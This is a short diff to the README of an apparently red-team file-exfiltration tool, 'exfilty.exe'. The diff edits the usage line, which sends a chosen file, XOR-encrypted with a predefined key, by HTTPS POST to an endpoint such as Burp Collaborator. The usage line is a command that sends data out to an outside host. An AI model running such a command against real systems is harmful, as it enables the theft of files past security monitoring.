@@ -18,7 +18,7 @@ The tool performs HTTPS POST-based file transfer to a specified endpoint, applyi
 
 ## Usage
 ```bash
-exfilty.exe https://your_endpoint> <file_to_exfiltrate>  # BurpSuite Collaborator recommended
+exfilty.exe <https://your_endpoint> <file_to_exfiltrate/transfer>  # BurpSuite Collaborator recommended
 ```
 
 The tool will read the file, apply XOR encryption using a predefined key, and send the result via HTTPS POST to the specified endpoint.
